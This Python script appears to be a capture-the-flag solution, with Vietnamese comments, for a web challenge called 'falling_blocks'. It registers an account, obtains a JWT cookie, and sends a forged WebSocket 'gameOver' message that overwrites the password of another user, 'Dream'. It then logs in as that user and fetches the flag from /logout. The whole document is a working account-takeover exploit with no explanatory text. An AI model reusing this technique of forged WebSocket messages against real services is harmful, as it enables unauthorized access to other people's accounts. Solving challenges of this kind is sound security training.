import requests
import json
import time
import websocket
import socket
from urllib.parse import urljoin

# Config
START_URL = "http://server-nlb-3829613530e79217.elb.us-east-1.amazonaws.com/start"
USERNAME = "pwn"
PASSWORD = "pwn"
NEW_DREAM_PASSWORD = "newpass"

# Hàm kiểm tra kết nối tới IP
def wait_for_instance(ip, ports=[80, 3000], timeout=300):
    print(f"[*] Checking instance {ip} on ports {ports}...")
    for port in ports:
        for _ in range(timeout):
            try:
                socket.create_connection((ip, port), timeout=2)
                print(f"[+] Instance is online on port {port}!")
                return port
            except (socket.timeout, ConnectionRefusedError):
                time.sleep(1)
    print(f"[-] Failed to connect to instance {ip} on any port")
    return None

# Bước 1: Khởi tạo instance và lấy IP
def get_instance_ip():
    headers = {"Content-Type": "application/json"}
    data = {"instance": "web/falling_blocks"}
    try:
        response = requests.post(START_URL, headers=headers, json=data, timeout=300)
        response.raise_for_status()
        ip = response.json().get("ip")
        if not ip:
            raise ValueError("No IP returned from start endpoint")
        print(f"[+] Instance IP: {ip}")
        return ip
    except Exception as e:
        print(f"[-] Error getting instance IP: {e}")
        exit(1)

# Bước 2: Đăng ký tài khoản
def register(base_url, username, password):
    url = urljoin(base_url, "/register")
    data = {"username": username, "password": password}
    try:
        response = requests.post(url, data=data, timeout=300)
        response.raise_for_status()
        print(f"[+] Registered user: {username}")
    except Exception as e:
        print(f"[-] Error registering user: {e}")
        exit(1)

# Bước 3: Đăng nhập và lấy cookie JWT
def login(base_url, username, password):
    url = urljoin(base_url, "/login")
    data = {"username": username, "password": password}
    try:
        response = requests.post(url, data=data, allow_redirects=False, timeout=300)
        response.raise_for_status()
        cookies = response.cookies.get_dict()
        jwt = cookies.get("user")
        if not jwt:
            raise ValueError("No JWT found in cookies")
        print(f"[+] JWT for {username}: {jwt[:20]}...")
        return jwt
    except Exception as e:
        print(f"[-] Error logging in: {e}")
        exit(1)

# Bước 4: Gửi gói WebSocket để ghi đè mật khẩu Dream
def send_websocket_payload(ip, port, jwt, new_password):
    ws_url = f"ws://{ip}:{port}/"
    payload = {
        "type": "gameOver",
        "time": int(time.time()),
        "score": 12345,
        "username": "Dream",
        "password": new_password
    }
    try:
        ws = websocket.WebSocket()
        headers = {"Cookie": f"user={jwt}"}
        ws.connect(ws_url, header=headers)
        ws.send(json.dumps(payload))
        print(f"[+] Sent WebSocket payload to overwrite Dream's password")
        ws.close()
    except Exception as e:
        print(f"[-] Error sending WebSocket payload: {e}")
        exit(1)

# Bước 5: Đăng nhập vào Dream với mật khẩu mới
def login_dream(base_url, new_password):
    url = urljoin(base_url, "/login")
    data = {"username": "Dream", "password": new_password}
    try:
        response = requests.post(url, data=data, allow_redirects=False, timeout=300)
        response.raise_for_status()
        cookies = response.cookies.get_dict()
        jwt = cookies.get("user")
        if not jwt:
            raise ValueError("No JWT found for Dream")
        print(f"[+] JWT for Dream: {jwt[:20]}...")
        return jwt
    except Exception as e:
        print(f"[-] Error logging in as Dream: {e}")
        exit(1)

# Bước 6: Gọi /logout để lấy flag
def get_flag(base_url, dream_jwt):
    url = urljoin(base_url, "/logout")
    cookies = {"user": dream_jwt}
    try:
        response = requests.get(url, cookies=cookies, timeout=300)
        response.raise_for_status()
        flag_data = response.json()
        flag = flag_data.get("message")
        if flag:
            print(f"[+] FLAG: {flag}")
        else:
            print(f"[-] No flag found in response: {response.text}")
    except Exception as e:
        print(f"[-] Error getting flag: {e}")
        exit(1)

def main():
    ip = get_instance_ip()
    port = wait_for_instance(ip)
    if not port:
        exit(1)

    base_url = f"http://{ip}:{port}"
    print(f"[+] Using base URL: {base_url}")
    register(base_url, USERNAME, PASSWORD)
    jwt = login(base_url, USERNAME, PASSWORD)
    send_websocket_payload(ip, port, jwt, NEW_DREAM_PASSWORD)
    dream_jwt = login_dream(base_url, NEW_DREAM_PASSWORD)
    get_flag(base_url, dream_jwt)

if __name__ == "__main__":
    import json
    main()